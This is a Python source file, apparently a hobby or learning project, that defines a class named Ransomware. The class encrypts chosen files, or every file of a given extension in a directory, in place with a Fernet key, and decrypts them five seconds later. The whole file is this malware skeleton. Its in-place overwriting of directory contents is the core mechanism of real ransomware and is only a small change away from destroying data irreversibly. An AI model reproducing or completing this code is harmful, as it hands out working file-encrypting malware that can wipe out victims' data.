from cryptography.fernet import Fernet
import time
import os
class Ransomware:
    """
    files takes either a list of files or one specific file in the directory
    ext takes a string without a . of the file types you want to encrypt
    dir takes a path to a dir that you want to encrypt
    """
    def __init__(self, files=0, ext=0, dir=0):
        self.directory = dir
        self.files = files
        self.ext = ext
        self.generate_key()

    #Generates a random key
    def generate_key(self):
        self.key = Fernet.generate_key()

    #For Specific Files
    def encrypt(self, filez):
        try:
            if self.extCheck(filez) == True:
                with open(filez, 'rb') as f:
                    data = f.read()
                with open(filez, 'wb') as f:
                    f.write(Fernet(self.key).encrypt(data))
        except:
            print("An error has occured encrypting your file:", filez)
    
    def decrypt(self, filez):
        try:
            if self.extCheck(filez) == True:
                with open(filez, 'rb') as f:
                    data = f.read()
                with open(filez, 'wb') as f:
                    f.write(Fernet(self.key).decrypt(data))
        except:
            print("An error has occured decrypting your file:", filez)
    
    #For Directories
    def dirEncrypt(self):
        try:
            #print(os.listdir(self.directory))
            os.chdir(self.directory)
            print(os.getcwd())
            for i in os.listdir(self.directory):
                if self.extCheck(i) == True:
                    self.encrypt(i)
                else:
                    pass
        except:
            print("An error has occured encrypting in", os.getcwd())
    
    def dirDecrypt(self):
        try:
            os.chdir(self.directory)
            print(os.getcwd())
            for i in os.listdir(self.directory):
                if self.extCheck(i) == True:
                    self.decrypt(i)
                else:
                    pass
        except:
            print("An error has occured decrypting in", os.getcwd())
    
    #Checks the if the file has the permitted extension type
    def extCheck(self, file):
        if file.split('.')[1] == self.ext or 0 == self.ext:
            return(True)
        return(False)


    def test(self):
        if isinstance(self.files, str):
            if self.files.split('.')[1] == self.ext or 0 == self.ext:
                self.encrypt(self.files)
                time.sleep(5)
                self.decrypt(self.files)
        elif isinstance(self.files, list):
            for i in self.files:
                if i.split('.')[1] == self.ext or 0 == self.ext:
                    self.encrypt(i)
                    time.sleep(5)
                    self.decrypt(i)

        
    def main(self):
        #self.test()
        if self.files != 0:
            for i in self.files:
                self.encrypt(i)
            time.sleep(5)
            for i in self.files:
                self.decrypt(i)
        if self.directory != 0:
            self.dirEncrypt()
            time.sleep(5)
            self.dirDecrypt()
        #print(self.key)


if __name__ == "__main__":
    pass



"""
What I still need to add:
1.) 
"""